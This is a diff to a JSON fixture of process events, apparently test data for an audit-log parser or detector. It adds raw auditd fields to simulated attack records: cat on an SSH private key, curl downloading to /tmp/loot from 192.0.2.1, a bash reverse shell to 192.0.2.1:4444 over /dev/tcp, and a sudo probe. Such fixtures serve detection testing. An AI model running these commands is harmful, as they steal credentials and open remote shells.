@@ -9,7 +9,42 @@
     "user": "1000",
     "currentDirectory": "/home/u",
     "pid": 1234,
-    "ppid": 1200
+    "ppid": 1200,
+    "raw": {
+      "a0": "cat",
+      "a1": "/home/u/.ssh/id_rsa",
+      "arch": "c000003e",
+      "argc": "2",
+      "auid": "1000",
+      "comm": "cat",
+      "cwd": "/home/u",
+      "exe": "/usr/bin/cat",
+      "exit": "0",
+      "gid": "1000",
+      "inode": "42",
+      "item": "0",
+      "pid": "1234",
+      "ppid": "1200",
+      "proctitle": "cat /home/u/.ssh/id_rsa",
+      "success": "yes",
+      "syscall": "59",
+      "uid": "1000"
+    },
+    "multi": {
+      "name": [
+        "/home/u/.ssh/id_rsa"
+      ],
+      "nametype": [
+        "NORMAL"
+      ],
+      "type": [
+        "SYSCALL",
+        "EXECVE",
+        "CWD",
+        "PATH",
+        "PROCTITLE"
+      ]
+    }
   },
   {
     "time": "2021-07-18T12:29:24Z",
@@ -21,7 +56,35 @@
     "user": "1000",
     "currentDirectory": "/home/u",
     "pid": 1240,
-    "ppid": 1200
+    "ppid": 1200,
+    "raw": {
+      "a0": "curl",
+      "a1": "-s",
+      "a2": "http://192.0.2.1/x",
+      "a3": "-o",
+      "a4": "/tmp/loot",
+      "arch": "c000003e",
+      "argc": "5",
+      "auid": "1000",
+      "comm": "curl",
+      "cwd": "/home/u",
+      "exe": "/usr/bin/curl",
+      "exit": "0",
+      "pid": "1240",
+      "ppid": "1200",
+      "proctitle": "6375726C002D730068747470...truncated",
+      "success": "yes",
+      "syscall": "59",
+      "uid": "1000"
+    },
+    "multi": {
+      "type": [
+        "SYSCALL",
+        "EXECVE",
+        "CWD",
+        "PROCTITLE"
+      ]
+    }
   },
   {
     "time": "2021-07-18T12:29:25.5Z",
@@ -31,7 +94,25 @@
     "parentImage": "",
     "targetFilename": "",
     "user": "1000",
-    "currentDirectory": ""
+    "currentDirectory": "",
+    "raw": {
+      "a0": "bash",
+      "a1": "-c",
+      "a2": "bash-i \u003e\u0026 /dev/tcp/192.0.2.1/4444",
+      "arch": "c000003e",
+      "argc": "3",
+      "auid": "1000",
+      "comm": "bash",
+      "exe": "/bin/bash",
+      "syscall": "59",
+      "uid": "1000"
+    },
+    "multi": {
+      "type": [
+        "SYSCALL",
+        "EXECVE"
+      ]
+    }
   },
   {
     "time": "2021-07-18T12:29:26Z",
@@ -41,6 +122,24 @@
     "parentImage": "",
     "targetFilename": "",
     "user": "1000",
-    "currentDirectory": ""
+    "currentDirectory": "",
+    "raw": {
+      "a0": "sudo",
+      "a1": "-n",
+      "a2": "true",
+      "arch": "c000003e",
+      "argc": "3",
+      "auid": "1000",
+      "comm": "sudo",
+      "exe": "/usr/bin/sudo",
+      "syscall": "59",
+      "uid": "1000"
+    },
+    "multi": {
+      "type": [
+        "SYSCALL",
+        "EXECVE"
+      ]
+    }
   }
 ]
